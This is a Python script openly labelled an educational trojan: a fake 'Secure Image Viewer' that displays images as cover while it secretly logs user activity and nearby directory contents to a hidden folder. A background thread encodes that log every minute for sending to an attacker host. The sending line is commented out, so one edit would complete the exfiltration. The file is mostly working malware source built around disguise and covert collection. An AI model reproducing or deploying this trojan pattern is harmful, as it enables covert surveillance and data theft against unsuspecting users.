#!/usr/bin/env python3
"""
Educational Trojan Horse - Image Viewer Example
FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY
This demonstrates how trojans hide malicious functionality behind legitimate features
"""

import os
import sys
import base64
import threading
import time
from datetime import datetime
from PIL import Image

# =============================================================================
# HIDDEN PAYLOAD (Malicious Component)
# =============================================================================

LOG_FILE = os.path.join(os.path.expanduser("~"), ".system_cache", "log.dat")
EXFIL_SERVER = "http://attacker-server.com/collect"

def ensure_hidden():
    """Create hidden directory for storing logs"""
    hidden_dir = os.path.join(os.path.expanduser("~"), ".system_cache")
    if not os.path.exists(hidden_dir):
        os.makedirs(hidden_dir)
        # Hide directory on Windows
        if sys.platform == "win32":
            import ctypes
            ctypes.windll.kernel32.SetFileAttributesW(hidden_dir, 0x02)

def log_activity(data):
    """Secretly log user activity"""
    ensure_hidden()
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(LOG_FILE, "a") as f:
        f.write(f"[{timestamp}] {data}\n")

def collect_system_info():
    """Gather system information for exfiltration"""
    import platform
    info = {
        "hostname": platform.node(),
        "os": platform.system(),
        "user": os.getlogin(),
        "timestamp": datetime.now().isoformat()
    }
    return info

def exfiltrate_data():
    """Background thread: periodically send data to remote server"""
    while True:
        time.sleep(60)  # Every minute
        try:
            if os.path.exists(LOG_FILE):
                with open(LOG_FILE, "rb") as f:
                    data = f.read()
                
                # Encode and prepare for transmission
                encoded = base64.b64encode(data).decode()
                
                # Simulated exfiltration (commented out for safety)
                # import requests
                # requests.post(EXFIL_SERVER, data={"payload": encoded})
                
                # Clear log after exfiltration
                open(LOG_FILE, "w").close()
                
                print("[DEBUG] Sync complete")  # Debug message masked as system message
        except Exception:
            pass

def start_background_threads():
    """Start hidden malicious threads"""
    # Start exfiltration thread
    exfil_thread = threading.Thread(target=exfiltrate_data, daemon=True)
    exfil_thread.start()
    
    # Log startup
    log_activity(f"Trojan initialized - User: {os.getlogin()}")

# =============================================================================
# LEGITIMATE FUNCTION (The Cover)
# =============================================================================

def display_image(image_path):
    """Legitimate image display functionality"""
    try:
        img = Image.open(image_path)
        img.show()
        print(f"Opened: {image_path}")
        print(f"Image size: {img.size}")
        print(f"Image mode: {img.mode}")
        return True
    except Exception as e:
        print(f"Error opening image: {e}")
        return False

def main():
    """Main entry point - appears legitimate"""
    print("=" * 50)
    print("Secure Image Viewer v2.1")
    print("A lightweight image viewing utility")
    print("=" * 50)
    
    # Initialize hidden payload
    start_background_threads()
    log_activity(f"Application started with args: {sys.argv}")
    
    if len(sys.argv) < 2:
        print("Usage: python viewer.py <image_file>")
        log_activity("No image provided - showing help")
        sys.exit(1)
    
    image_path = sys.argv[1]
    
    # Log the target file
    log_activity(f"Target image accessed: {image_path}")
    
    if not os.path.exists(image_path):
        print(f"Error: File '{image_path}' not found")
        log_activity(f"File not found: {image_path}")
        sys.exit(1)
    
    # Perform legitimate action
    log_activity("Displaying image to user (cover activity)")
    success = display_image(image_path)
    
    if success:
        log_activity("Image displayed successfully")
        
        # Simulate additional reconnaissance while user views image
        try:
            # Read file metadata
            stat = os.stat(image_path)
            log_activity(f"File metadata - Size: {stat.st_size}, Modified: {stat.st_mtime}")
            
            # List nearby files (reconnaissance)
            directory = os.path.dirname(os.path.abspath(image_path)) or "."
            nearby = os.listdir(directory)[:10]  # First 10 files
            log_activity(f"Directory contents: {nearby}")
            
        except Exception as e:
            log_activity(f"Reconnaissance error: {e}")
    
    print("Press Enter to exit...")
    input()
    log_activity("Application closing normally")

if __name__ == "__main__":
    main()
